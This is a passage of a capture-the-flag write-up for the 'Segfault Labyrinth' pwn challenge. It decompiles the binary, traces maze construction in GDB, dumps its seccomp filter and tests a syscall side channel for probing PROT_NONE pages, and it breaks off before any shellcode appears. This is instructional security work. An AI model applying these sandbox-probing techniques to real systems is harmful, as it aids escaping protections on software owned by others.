# Segfault Labyrinth

Categories: Misc/Pwn

Description:
> Be careful! One wrong turn and the whole thing comes crashing down
>
> `% nc segfault-labyrinth.2022.ctfcompetition.com 1337` <br/>
>
> [challenge.zip](resources/52dfc0e5d7ec9438e47b7ca7e721b87bb14a86d55e2970fdec94cd4ddac4d6fbd129f16780feaf6dc756b79319712cc980a60e52749b4b691bc9f9769831d697.zip)<br/>

**Tags:** maze, shellcode, assembly compiling, pointers, self-modifying code

## Takeaways

* When doing a syscall, and passing a buffer in a `PROT_NONE` page, the program does not segfault. Instead the syscall returns an error code (e.g. -1) and sets `errno`. We use this as a side-channel to infer the process' memory mappings.
* In GDB, use hardware breakpoints when dealing with self-modifying code. (If you use software breakpoints, gdb might introduce bugs in the program).

## Solution

For the binary, we will assume the base address `0x100000`. First, we open the binary in ghidra and reverse engineer it:

```c
#include "seg-faulting-labs.h"
#include <stdio.h>
#include <sys/mman.h>
#include <linux/seccomp.h>

/* WARNING: Could not reconcile some variable overlaps */
/* Address 0x101100 */
int main(int argc,char **argv) {
  int rand_int;
  int iVar1;
  FILE *urandom_fd;
  ulong **base;
  size_t sVar2;
  ulong *puVar3;
  FILE *flag_fd;
  code *__dest;
  ssize_t sVar4;
  ulong depth;
  ulong **level;
  ulong i;
  ulong uVar5;
  undefined2 local_108 [4];
  ulong *local_100;
  ulong local_f8;
  undefined8 local_f0;
  undefined8 local_e8;
  undefined8 local_e0;
  undefined8 local_d8;
  undefined8 local_d0;
  undefined8 local_c8;
  undefined8 local_c0;
  undefined8 local_b8;
  undefined8 local_b0;
  undefined8 local_a8;
  undefined8 local_a0;
  undefined8 local_98;
  undefined8 local_90;
  undefined8 local_88;
  undefined8 local_80;
  undefined8 local_78;
  undefined8 local_70;
  undefined8 local_68;
  undefined8 local_60;
  undefined8 local_58;
  undefined2 local_50;
  undefined2 local_4e;
  undefined4 local_4c;
  undefined8 local_48;
  
  if (setvbuf(stdout,NULL,_IONBF,0) != 0) {
    fwrite("Error: failed to disable output buffering. Exiting\n",1,0x33,stderr);
    return -1;
  }
  if (setvbuf(stdin,NULL,_IONBF,0) != 0) {
    fwrite("Error: failed to disable input buffering. Exiting\n",1,0x32,stderr);
    return -1;
  }

  urandom_fd = fopen("/dev/urandom","r");
  if (urandom_fd == NULL) {
    fwrite("Error: failed to open urandom. Exiting\n",1,0x27,stderr);
    return -1;
  }

  base = (ulong **)mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS,-1,0);

  /* 10*16 == 160 pointers. 
    * Each 16 pointers, only 1 is valid.
    * From each allocated page of 0x1000 bytes, only the first 16*8 == 0x80 bytes are used (16 pointers - 1 points to RW, the rest to PROT_NONE)
  */
  level = base;
  for(depth=10; depth !=0; --depth) {
    sVar2 = fread(&local_f8,1,1,urandom_fd);
    if (sVar2 != 1) {
      fwrite("Error: failed to read random. Exiting.\n",1,0x27,stderr);
      fwrite("Error: failed to build labyrinth. Exiting\n",1,0x2a,stderr);
      return -1;
    }

    ulong rand_nibble = (byte)(local_f8) & 0x0f;
    for(uint i=0; i<16; ++i) {
      rand_int = rand();
      int permissions = ( (rand_nibble == i) ) ? PROT_READ|PROT_WRITE : PROT_NONE;
      puVar3 = (ulong *)mmap((long)rand_int*0x1000 + 0x10000, 0x1000, permissions, MAP_PRIVATE | MAP_ANONYMOUS, -1,0);
      level[i] = puVar3;  /* Does this mean that we only use the first 16*8 bytes? of the mmaped region? Yes! */
      if (puVar3 == NULL) {
        fwrite("Error: failed to allocate memory.\n",1,0x22,stderr);
        fwrite("Error: failed to build labyrinth. Exiting\n",1,0x2a,stderr);
        return -1;
      }
    }
    level = (ulong **)level[rand_nibble];
    if (level == NULL) {
      fwrite("Error: failed to build labyrinth. Exiting\n",1,0x2a,stderr);
      return -1;
    }
  }
  fclose(urandom_fd);


  flag_fd = fopen("flag.txt","r");
  if (flag_fd == NULL) {
    fwrite("Error: failed to open flag. Exiting.\n",1,0x25,stderr);
    return -1;
  }
  sVar2 = fread(level,1,0x1000,flag_fd);  //The whole last level is populated by the flag
  if (sVar2 == 0) {
    fwrite("Error: failed to read flag. Exiting.\n",1,0x25,stderr);
    return -1;
  }
  fclose(flag_fd);


  __dest = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1,0);  //RWX
  if (__dest == NULL) {
    fwrite("Error: failed to allocate shellcode memory. Exiting.\n",1,0x35,stderr);
    return -1;
  }
  
  memcpy(__dest,BYTE_ARRAY_00104088,0x2d);    //Store our shellcode after the 0x2d bytes
  puts("Welcome to the Segfault Labyrinth");

  //seccomp filter setup. See seccomp-tools dump
  local_c8 = 0xe701000015;
  local_f8 = 0x400000020;
  local_b8 = 0x3c01000015;
  local_f0 = 0xc000003e00010015;
  local_98 = 0x901000015;
  local_d8 = 0xf01000015;
  local_88 = 0xb01000015;
  local_d0 = 0x7fff000000000006;
  local_c0 = 0x7fff000000000006;
  local_b0 = 0x7fff000000000006;
  local_a0 = 0x7fff000000000006;
  local_90 = 0x7fff000000000006;
  local_80 = 0x7fff000000000006;
  local_78 = 0x501000015;
  local_70 = 0x7fff000000000006;
  local_60 = 0x7fff000000000006;
  local_68 = 0x401000015;
  local_58 = 0x101000015;
  local_e8 = 6;
  local_e0 = 0x20;
  local_a8 = 0x1000015;
  local_50 = 6;
  local_4e = 0;
  local_4c = 0x7fff0000;
  local_48 = 6;
  local_108[0] = 0x17;
  local_100 = &local_f8;

  /* Even if the prctl fail, the program does not exit? */
  if (prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0) == 0) {
    if (prctl(PR_SET_SECCOMP,2,local_108) != 0) {
      perror("prctl(PR_SET_SECCOMP)");
    }
  }
  else {
    perror("prctl(NO_NEW_PRIVS)");
  }

  //read an unsigned long, which represents the number of bytes to be further read. Range: [0, 4050]
  ulong val;
  uVar5 = 0;
  do {
    sVar4 = read(0,&val,8 - uVar5);
    uVar5 = uVar5 + sVar4;
  } while (uVar5 < 8);
  if (uVar5 != 8) {
    fwrite("Error: failed to read code size. Exiting.\n",1,0x2a,stderr);
    return -1;
  }

  val = val % 4051; //[0, 4050]
  if (val != 0) {
    /* read exactly val bytes ([0, 4050]) to `__dest + 0x2d` (RWX region). So this is our shellcode
      * The region [__dest, __dest+0x2d) contains the assembly from BYTE_ARRAY_00104088, which clears most of the registers
      * 
    */

    ulong nread = 0;
    do {
      sVar4 = read(0, __dest + 0x2d, val - nread);
      nread += sVar4;
    } while (nread < val);
    if (nread != val) {
      fwrite("Error: failed to read code. Exiting.\n",1,0x25,stderr);
      return -1;
    }
  }
  (*__dest)(base);  //invokes the shellcode

  return 0;
}
```

As we can read form the source, the following things are happening:

1. The program builds the maze
2. The program maps a RWX region
3. The program sets up a seccomp filter
4. The program reads up to 4050 bytes into the RWX region and jumps to it (shellcode)

### Maze building

Let's first understand how the maze is built. Let's start with the inner loop:

```c
sVar2 = fread(&local_f8,1,1,urandom_fd);
ulong rand_nibble = (byte)(local_f8) & 0x0f;
for(uint i=0; i<16; ++i) {
    rand_int = rand();
    int permissions = ( (rand_nibble == i) ) ? PROT_READ|PROT_WRITE : PROT_NONE;
    puVar3 = (ulong *)mmap((long)rand_int*0x1000 + 0x10000, 0x1000, permissions, MAP_PRIVATE | MAP_ANONYMOUS, -1,0);
    level[i] = puVar3;
    if (puVar3 == NULL) {
    fwrite("Error: failed to allocate memory.\n",1,0x22,stderr);
    fwrite("Error: failed to build labyrinth. Exiting\n",1,0x2a,stderr);
    return -1;
    }
}
level = (ulong **)level[rand_nibble];
```

The program allocates 16 pages. 15 of these will have `PROT_NONE` permissions and only one of them will have `RW` permissions. The page with the `RW` permissions is randomly chosen.

Let's also examine the outer loop:

```c
base = (ulong **)mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS,-1,0);
level = base;
for(depth=10; depth !=0; --depth) {
    sVar2 = fread(&local_f8,1,1,urandom_fd);
    if (sVar2 != 1) {
        fwrite("Error: failed to read random. Exiting.\n",1,0x27,stderr);
        fwrite("Error: failed to build labyrinth. Exiting\n",1,0x2a,stderr);
        return -1;
    }

    ulong rand_nibble = (byte)(local_f8) & 0x0f;
    /* <inner loop start> */
    /* .................. */
    /* <inner loop end  > */
    level = (ulong **)level[rand_nibble];
    if (level == NULL) {
        fwrite("Error: failed to build labyrinth. Exiting\n",1,0x2a,stderr);
        return -1;
    }
}
fclose(urandom_fd);

flag_fd = fopen("flag.txt","r");
sVar2 = fread(level,1,0x1000,flag_fd);
fclose(flag_fd);
```

As we can see, the maze has 10 levels. Each level consists of 16 pointers. 15 of these pointers point to `PROT_NONE` pages, and only 1 of them points to a `RW` page (next level). The last level contains the contents of "flag.txt".

Let's use a gdbscript to visualize the building process:

```gdb
set pagination off
set $BASE=0x00555555554000
gef config context.enable False

# main
break *($BASE+0x1100)
command

    # 001011c0 88 44 24 20  MOV byte ptr [RSP + local_f8],AL
    break *($BASE+0x11c0)
    command
        silent
        printf "random nibble: %02d\n", $rax
        continue
    end

    # after
    # rand_int = rand();
    # puVar3 = (ulong *)mmap((void *)((long)rand_int * 0x1000 + 0x10000),0x1000,
    #                         (uint)(uVar5 == i) * 3,0x22,-1,0);
    break *($BASE+0x1217)
    command
        silent
        set $touchable=($rdx == 0x3)
        printf "[%02d] Setting %p to 0x%016lx (TOUCHABLE: %d)\n", $r15, ((unsigned long)$rbp + (unsigned long)$r15*0x8), $rax, $touchable
        continue
    end

    # after: (code *)mmap((void *)0x0,0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, 0x22,-1,0);
    break *($BASE+0x012b6)
    command
        silent
        printf "shellcode loaded at address %p\n", $rax

        # use hardware breakpoint because of self-modifying code.
        # Otherwise the shellcode area gets corrupted by gdb
        hbreak *($rax+0x2d)
        command
            # commands to execute when we reach our shellcode
            gef config context.enable True
            context
            printf "l33tcode reached\n" 
        end
        continue
    end

    continue
end

continue
```

```bash
random nibble: 10
[00] Setting 0x7ffff7ffa000 to 0x000006b8b4577000 (TOUCHABLE: 0)
[01] Setting 0x7ffff7ffa008 to 0x00000327b23d6000 (TOUCHABLE: 0)
[02] Setting 0x7ffff7ffa010 to 0x00000643c9879000 (TOUCHABLE: 0)
[03] Setting 0x7ffff7ffa018 to 0x0000066334883000 (TOUCHABLE: 0)
[04] Setting 0x7ffff7ffa020 to 0x0000074b0dc61000 (TOUCHABLE: 0)
[05] Setting 0x7ffff7ffa028 to 0x0000019495d0f000 (TOUCHABLE: 0)
[06] Setting 0x7ffff7ffa030 to 0x000002ae8945a000 (TOUCHABLE: 0)
[07] Setting 0x7ffff7ffa038 to 0x00000625558fc000 (TOUCHABLE: 0)
[08] Setting 0x7ffff7ffa040 to 0x00000238e1f39000 (TOUCHABLE: 0)
[09] Setting 0x7ffff7ffa048 to 0x0000046e87cdd000 (TOUCHABLE: 0)
[10] Setting 0x7ffff7ffa050 to 0x000003d1b58ca000 (TOUCHABLE: 1)
[11] Setting 0x7ffff7ffa058 to 0x00000507ed7bb000 (TOUCHABLE: 0)
[12] Setting 0x7ffff7ffa060 to 0x000002eb14202000 (TOUCHABLE: 0)
[13] Setting 0x7ffff7ffa068 to 0x0000041b71f0b000 (TOUCHABLE: 0)
[14] Setting 0x7ffff7ffa070 to 0x0000079e2a9f3000 (TOUCHABLE: 0)
[15] Setting 0x7ffff7ffa078 to 0x000007545e156000 (TOUCHABLE: 0)

random nibble: 01
[00] Setting 0x3d1b58ca000 to 0x00000515f008c000 (TOUCHABLE: 0)
[01] Setting 0x3d1b58ca008 to 0x000005bd062d2000 (TOUCHABLE: 1)
[02] Setting 0x3d1b58ca010 to 0x0000012200864000 (TOUCHABLE: 0)
[03] Setting 0x3d1b58ca018 to 0x000004db12808000 (TOUCHABLE: 0)
[04] Setting 0x3d1b58ca020 to 0x000000216232b000 (TOUCHABLE: 0)
[05] Setting 0x3d1b58ca028 to 0x000001f16e9f8000 (TOUCHABLE: 0)
[06] Setting 0x3d1b58ca030 to 0x000001190cdf7000 (TOUCHABLE: 0)
[07] Setting 0x3d1b58ca038 to 0x0000066ef439d000 (TOUCHABLE: 0)
[08] Setting 0x3d1b58ca040 to 0x00000140e0f86000 (TOUCHABLE: 0)
[09] Setting 0x3d1b58ca048 to 0x000003352256a000 (TOUCHABLE: 0)
[10] Setting 0x3d1b58ca050 to 0x00000109cf93e000 (TOUCHABLE: 0)
[11] Setting 0x3d1b58ca058 to 0x000000ded7273000 (TOUCHABLE: 0)
[12] Setting 0x3d1b58ca060 to 0x000007fdcc243000 (TOUCHABLE: 0)
[13] Setting 0x3d1b58ca068 to 0x000001befd7af000 (TOUCHABLE: 0)
[14] Setting 0x3d1b58ca070 to 0x0000041a7c4d9000 (TOUCHABLE: 0)
[15] Setting 0x3d1b58ca078 to 0x000006b6807aa000 (TOUCHABLE: 0)

random nibble: 14
[00] Setting 0x5bd062d2000 to 0x000004e6afb76000 (TOUCHABLE: 0)
[01] Setting 0x5bd062d2008 to 0x0000025e45d42000 (TOUCHABLE: 0)
[02] Setting 0x5bd062d2010 to 0x00000519b501d000 (TOUCHABLE: 0)
[03] Setting 0x5bd062d2018 to 0x00000431bd7c7000 (TOUCHABLE: 0)
[04] Setting 0x5bd062d2020 to 0x000003f2dba41000 (TOUCHABLE: 0)
[05] Setting 0x5bd062d2028 to 0x000007c83e468000 (TOUCHABLE: 0)
[06] Setting 0x5bd062d2030 to 0x00000257130b3000 (TOUCHABLE: 0)
[07] Setting 0x5bd062d2038 to 0x0000062bbd96a000 (TOUCHABLE: 0)
[08] Setting 0x5bd062d2040 to 0x00000436c6135000 (TOUCHABLE: 0)
[09] Setting 0x5bd062d2048 to 0x00000628c896d000 (TOUCHABLE: 0)
[10] Setting 0x5bd062d2050 to 0x00000333ab115000 (TOUCHABLE: 0)
[11] Setting 0x5bd062d2058 to 0x00000721da327000 (TOUCHABLE: 0)
[12] Setting 0x5bd062d2060 to 0x000002443a868000 (TOUCHABLE: 0)
[13] Setting 0x5bd062d2068 to 0x000002d1d5af9000 (TOUCHABLE: 0)
[14] Setting 0x5bd062d2070 to 0x000006763846e000 (TOUCHABLE: 1)
[15] Setting 0x5bd062d2078 to 0x0000075a2a8e4000 (TOUCHABLE: 0)

random nibble: 02
[00] Setting 0x6763846e000 to 0x0000008edbdbb000 (TOUCHABLE: 0)
[01] Setting 0x6763846e008 to 0x0000079838cc2000 (TOUCHABLE: 0)
[02] Setting 0x6763846e010 to 0x000004353d0dd000 (TOUCHABLE: 1)
[03] Setting 0x6763846e018 to 0x000000b03e0d6000 (TOUCHABLE: 0)
[04] Setting 0x6763846e020 to 0x00000189a76ab000 (TOUCHABLE: 0)
[05] Setting 0x6763846e028 to 0x0000054e49ec4000 (TOUCHABLE: 0)
[06] Setting 0x6763846e030 to 0x0000071f32464000 (TOUCHABLE: 0)
[07] Setting 0x6763846e038 to 0x000002ca88621000 (TOUCHABLE: 0)
[08] Setting 0x6763846e040 to 0x000000836c41e000 (TOUCHABLE: 0)
[09] Setting 0x6763846e048 to 0x0000002901d92000 (TOUCHABLE: 0)
[10] Setting 0x6763846e050 to 0x000003a95f884000 (TOUCHABLE: 0)
[11] Setting 0x6763846e058 to 0x0000008138651000 (TOUCHABLE: 0)
[12] Setting 0x6763846e060 to 0x000001e7ff531000 (TOUCHABLE: 0)
[13] Setting 0x6763846e068 to 0x000007c3dbd4d000 (TOUCHABLE: 0)
[14] Setting 0x6763846e070 to 0x00000737b8dec000 (TOUCHABLE: 0)
[15] Setting 0x6763846e078 to 0x000006ceaf097000 (TOUCHABLE: 0)

random nibble: 00
[00] Setting 0x4353d0dd000 to 0x0000022221a80000 (TOUCHABLE: 1)
[01] Setting 0x4353d0dd008 to 0x000004516ddf9000 (TOUCHABLE: 0)
[02] Setting 0x4353d0dd010 to 0x000003006c84e000 (TOUCHABLE: 0)
[03] Setting 0x4353d0dd018 to 0x00000614fd4b1000 (TOUCHABLE: 0)
[04] Setting 0x4353d0dd020 to 0x00000419ac251000 (TOUCHABLE: 0)
[05] Setting 0x4353d0dd028 to 0x000005577f8f1000 (TOUCHABLE: 0)
[06] Setting 0x4353d0dd030 to 0x00000440bae0c000 (TOUCHABLE: 0)
[07] Setting 0x4353d0dd038 to 0x0000005072377000 (TOUCHABLE: 0)
[08] Setting 0x4353d0dd040 to 0x000003804824e000 (TOUCHABLE: 0)
[09] Setting 0x4353d0dd048 to 0x0000077465f11000 (TOUCHABLE: 0)
[10] Setting 0x4353d0dd050 to 0x000007724c68e000 (TOUCHABLE: 0)
[11] Setting 0x4353d0dd058 to 0x000005c482aa7000 (TOUCHABLE: 0)
[12] Setting 0x4353d0dd060 to 0x000002463b9fa000 (TOUCHABLE: 0)
[13] Setting 0x4353d0dd068 to 0x000005e884aec000 (TOUCHABLE: 0)
[14] Setting 0x4353d0dd070 to 0x0000051ead37b000 (TOUCHABLE: 0)
[15] Setting 0x4353d0dd078 to 0x000002d5177a6000 (TOUCHABLE: 0)

random nibble: 08
[00] Setting 0x22221a80000 to 0x00000580bd79f000 (TOUCHABLE: 0)
[01] Setting 0x22221a80008 to 0x00000153ea448000 (TOUCHABLE: 0)
[02] Setting 0x22221a80010 to 0x000003855586c000 (TOUCHABLE: 0)
[03] Setting 0x22221a80018 to 0x0000070a64e3a000 (TOUCHABLE: 0)
[04] Setting 0x22221a80020 to 0x000006a2342fc000 (TOUCHABLE: 0)
[05] Setting 0x22221a80028 to 0x000002a487cc0000 (TOUCHABLE: 0)
[06] Setting 0x22221a80030 to 0x000001d4ed44b000 (TOUCHABLE: 0)
[07] Setting 0x22221a80038 to 0x00000725a070b000 (TOUCHABLE: 0)
[08] Setting 0x22221a80040 to 0x000002cd89a42000 (TOUCHABLE: 1)
[09] Setting 0x22221a80048 to 0x0000057e4ccbf000 (TOUCHABLE: 0)
[10] Setting 0x22221a80050 to 0x000007a6d8d4c000 (TOUCHABLE: 0)
[11] Setting 0x22221a80058 to 0x000004b588f64000 (TOUCHABLE: 0)
[12] Setting 0x22221a80060 to 0x00000542289fc000 (TOUCHABLE: 0)
[13] Setting 0x22221a80068 to 0x000006de91b28000 (TOUCHABLE: 0)
[14] Setting 0x22221a80070 to 0x0000038437feb000 (TOUCHABLE: 0)
[15] Setting 0x22221a80078 to 0x000007644a46c000 (TOUCHABLE: 0)

random nibble: 08
[00] Setting 0x2cd89a42000 to 0x0000032fff912000 (TOUCHABLE: 0)
[01] Setting 0x2cd89a42008 to 0x00000684a482a000 (TOUCHABLE: 0)
[02] Setting 0x2cd89a42010 to 0x000005794790e000 (TOUCHABLE: 0)
[03] Setting 0x2cd89a42018 to 0x00000749abb53000 (TOUCHABLE: 0)
[04] Setting 0x2cd89a42020 to 0x000003dc2410b000 (TOUCHABLE: 0)
[05] Setting 0x2cd89a42028 to 0x000001ba0270a000 (TOUCHABLE: 0)
[06] Setting 0x2cd89a42030 to 0x0000079a1deba000 (TOUCHABLE: 0)
[07] Setting 0x2cd89a42038 to 0x0000075c6c34a000 (TOUCHABLE: 0)
[08] Setting 0x2cd89a42040 to 0x0000012e6860b000 (TOUCHABLE: 1)
[09] Setting 0x2cd89a42048 to 0x0000070c6a539000 (TOUCHABLE: 0)
[10] Setting 0x2cd89a42050 to 0x00000520eede1000 (TOUCHABLE: 0)
[11] Setting 0x2cd89a42058 to 0x00000374a3ff6000 (TOUCHABLE: 0)
[12] Setting 0x2cd89a42060 to 0x000004f4ef015000 (TOUCHABLE: 0)
[13] Setting 0x2cd89a42068 to 0x0000023f9c14c000 (TOUCHABLE: 0)
[14] Setting 0x2cd89a42070 to 0x00000649bb78c000 (TOUCHABLE: 0)
[15] Setting 0x2cd89a42078 to 0x00000275ac7a4000 (TOUCHABLE: 0)

random nibble: 06
[00] Setting 0x12e6860b000 to 0x0000039386585000 (TOUCHABLE: 0)
[01] Setting 0x12e6860b008 to 0x000001cf10fe8000 (TOUCHABLE: 0)
[02] Setting 0x12e6860b010 to 0x00000180115ce000 (TOUCHABLE: 0)
[03] Setting 0x12e6860b018 to 0x00000235ba871000 (TOUCHABLE: 0)
[04] Setting 0x12e6860b020 to 0x0000047398c99000 (TOUCHABLE: 0)
[05] Setting 0x12e6860b028 to 0x00000354fea09000 (TOUCHABLE: 0)
[06] Setting 0x12e6860b030 to 0x0000015b5af6c000 (TOUCHABLE: 1)
[07] Setting 0x12e6860b038 to 0x00000741226cb000 (TOUCHABLE: 0)
[08] Setting 0x12e6860b040 to 0x000000d34b6b8000 (TOUCHABLE: 0)
[09] Setting 0x12e6860b048 to 0x0000010233ca9000 (TOUCHABLE: 0)
[10] Setting 0x12e6860b050 to 0x000003f6ab61f000 (TOUCHABLE: 0)
[11] Setting 0x12e6860b058 to 0x00000615740a5000 (TOUCHABLE: 0)
[12] Setting 0x12e6860b060 to 0x000007e0c57c1000 (TOUCHABLE: 0)
[13] Setting 0x12e6860b068 to 0x0000077ae35fb000 (TOUCHABLE: 0)
[14] Setting 0x12e6860b070 to 0x00000579be501000 (TOUCHABLE: 0)
[15] Setting 0x12e6860b078 to 0x00000310c50c3000 (TOUCHABLE: 0)

random nibble: 11
[00] Setting 0x15b5af6c000 to 0x000005ff87e15000 (TOUCHABLE: 0)
[01] Setting 0x15b5af6c008 to 0x000002f305dff000 (TOUCHABLE: 0)
[02] Setting 0x15b5af6c010 to 0x0000025a70c07000 (TOUCHABLE: 0)
[03] Setting 0x15b5af6c018 to 0x000001dbabf10000 (TOUCHABLE: 0)
[04] Setting 0x15b5af6c020 to 0x000004ad084f9000 (TOUCHABLE: 0)
[05] Setting 0x15b5af6c028 to 0x000001f48eab1000 (TOUCHABLE: 0)
[06] Setting 0x15b5af6c030 to 0x000001381824a000 (TOUCHABLE: 0)
[07] Setting 0x15b5af6c038 to 0x000005db70af5000 (TOUCHABLE: 0)
[08] Setting 0x15b5af6c040 to 0x00000100f8fda000 (TOUCHABLE: 0)
[09] Setting 0x15b5af6c048 to 0x000006590701b000 (TOUCHABLE: 0)
[10] Setting 0x15b5af6c050 to 0x0000015014adb000 (TOUCHABLE: 0)
[11] Setting 0x15b5af6c058 to 0x000005f5e7fe0000 (TOUCHABLE: 1)
[12] Setting 0x15b5af6c060 to 0x00000098a3158000 (TOUCHABLE: 0)
[13] Setting 0x15b5af6c068 to 0x00000799d0257000 (TOUCHABLE: 0)
[14] Setting 0x15b5af6c070 to 0x0000006b94774000 (TOUCHABLE: 0)
[15] Setting 0x15b5af6c078 to 0x0000042c296cd000 (TOUCHABLE: 0)

random nibble: 12
[00] Setting 0x5f5e7fe0000 to 0x00000168e122f000 (TOUCHABLE: 0)
[01] Setting 0x5f5e7fe0008 to 0x000001eba5d33000 (TOUCHABLE: 0)
[02] Setting 0x5f5e7fe0010 to 0x00000661e3f2e000 (TOUCHABLE: 0)
[03] Setting 0x5f5e7fe0018 to 0x000005dc79eb8000 (TOUCHABLE: 0)
[04] Setting 0x5f5e7fe0020 to 0x00000540a472c000 (TOUCHABLE: 0)
[05] Setting 0x5f5e7fe0028 to 0x000007bd3ee8b000 (TOUCHABLE: 0)
[06] Setting 0x5f5e7fe0030 to 0x0000051d9c574000 (TOUCHABLE: 0)
[07] Setting 0x5f5e7fe0038 to 0x00000613efdd5000 (TOUCHABLE: 0)
[08] Setting 0x5f5e7fe0040 to 0x000000bf72b24000 (TOUCHABLE: 0)
[09] Setting 0x5f5e7fe0048 to 0x0000011447b83000 (TOUCHABLE: 0)
[10] Setting 0x5f5e7fe0050 to 0x0000042963e6a000 (TOUCHABLE: 0)
[11] Setting 0x5f5e7fe0058 to 0x000000a0382d5000 (TOUCHABLE: 0)
[12] Setting 0x5f5e7fe0060 to 0x0000008f2b16e000 (TOUCHABLE: 1)
[13] Setting 0x5f5e7fe0068 to 0x000001a32235b000 (TOUCHABLE: 0)
[14] Setting 0x5f5e7fe0070 to 0x000003b0fd389000 (TOUCHABLE: 0)
[15] Setting 0x5f5e7fe0078 to 0x0000068eb2f73000 (TOUCHABLE: 0)

shellcode loaded at address 0x7ffff7fba000
```

And if we examine the memory from the last level, we will observe the flag:

```gdb
(gdb) x/16bc 0x0000008f2b16e000
0xa0382d5000:   67 'C'  84 'T'  70 'F'  123 '{' 99 'c'  48 '0'  110 'n' 103 'g'
0xa0382d5008:   114 'r' 97 'a'  116 't' 117 'u' 108 'l' 97 'a'  116 't' 49 '1'
```

### `RWX` region

As we can see, the program allocates a RWX region, stores up to 4050 user-defined bytes, and eventually jumps to it.

```c
__dest = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1,0);
memcpy(__dest,BYTE_ARRAY_00104088,0x2d); //Store our shellcode after the 0x2d bytes

//read sz
ulong val;
uVar5 = 0;
do {
    sVar4 = read(0,&val,8 - uVar5);
    uVar5 = uVar5 + sVar4;
} while (uVar5 < 8);
if (uVar5 != 8)
    return -1;
val = val % 4051; //[0, 4050]
if (val > 0) {
    // read exactly `val` bytes into `__dest + 0x2d`
    ulong nread = 0;
    do {
        sVar4 = read(0, __dest + 0x2d, val - nread);
        nread += sVar4;
    } while (nread < val);
    if (nread != val)
        return -1;
}
(*__dest)(base);  //invokes the shellcode
```

But the program does not directly jump to our shellcode. Our shellcode is prefixed with `0x2d` bytes copied from `0x104088`. So, let's analyze that address as code:

```asm
    LAB_00104088 XREF[1]:     main:001012c2(*)  
00104088 48 31 c0  XOR  RAX,RAX
0010408b 48 31 c9  XOR  RCX,RCX
0010408e 48 31 d2  XOR  RDX,RDX
00104091 48 31 db  XOR  RBX,RBX
00104094 48 31 f6  XOR  RSI,RSI
00104097 48 31 e4  XOR  RSP,RSP
0010409a 48 31 ed  XOR  RBP,RBP
0010409d 4d 31 c0  XOR  R8,R8
001040a0 4d 31 c9  XOR  R9,R9
001040a3 4d 31 d2  XOR  R10,R10
001040a6 4d 31 db  XOR  R11,R11
001040a9 4d 31 e4  XOR  R12,R12
001040ac 4d 31 ed  XOR  R13,R13
001040af 4d 31 f6  XOR  R14,R14
001040b2 4d 31 ff  XOR  R15,R15
```

So the prefix clears a bunch of registers to prevent cheesy solutions. After the prefix is executed, all registers are zero except: `RDI` (pointer to the base of the maze) and `RIP`. Even `RSP` is zero.

### seccomp filter

To analyze the seccomp filter, we will use [seccomp-tools](https://github.com/david942j/seccomp-tools).

```bash
nikos@ctf-box:~/ctfs/googleCTF22/misc/seg-fault-lab$ seccomp-tools dump ./challenge
Welcome to the Segfault Labyrinth
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x0000000b  if (A != munmap) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x15 0x00 0x01 0x00000005  if (A != fstat) goto 0018
 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0018: 0x15 0x00 0x01 0x00000004  if (A != stat) goto 0020
 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0020: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0022
 0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0022: 0x06 0x00 0x00 0x00000000  return KILL
```

As we can see, only a limited number of syscalls are allowed and no `open` to grab the flag in a cheesy way.

### shellcode

So, let's create our shellcode. We will traverse these pointers starting from the `base` stored in `RDI`. On each level, we have 16 pointers and we have to figure out which is the correct one without seg faulting. One way would be to parse `/proc/self/maps` but we do not have the `open` syscall. Another way would be to look at `/proc/self/map_files` but the mappings are `MAP_ANONYMOUS` and again we do not have `open`.

We will use a different side-channel. Let's make the hypothesis that syscalls, when invoked with a user buffer in a `PROT_NONE` page, do not cause a segmentation fault. Instead, they return an error code (e.g. `-1`) and set `errno`. Let's test this:

```c
#include <sys/mman.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <stdio.h>
#include <assert.h>

int main() {
    struct stat mybuf;

    void *res = mmap(NULL, 0x1000, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    assert(res);

    //CWD contains "flag.txt" file
    //int stat(const char *restrict path, struct stat *restrict buf);

    int syscall_res;
    syscall_res = stat("flag.txt", &mybuf); //simulate RW page
    printf("Valid   syscall result: %d\n", syscall_res);

    syscall_res = stat("flag.txt", res);    //simulate PROT_NONE page
    printf("Invalid syscall result: %d\n", syscall_res);

    return 0;
}
```

And if we execute it:

```bash
nikos@ctf-box:~/tmp$ gcc test.c -o test
nikos@ctf-box:~/tmp$ ./test
Valid   syscall result: 0
Invalid syscall result: -1
```

Great! As we can see, if we use an invalid buffer in a `PROT_NONE` page, the program does not segfault but instead `-1` is returned. Our hypothesis was correct and we can perform our side-channel now.

Let's write C pseudo-code before we write our shellcode in assembly.

```c
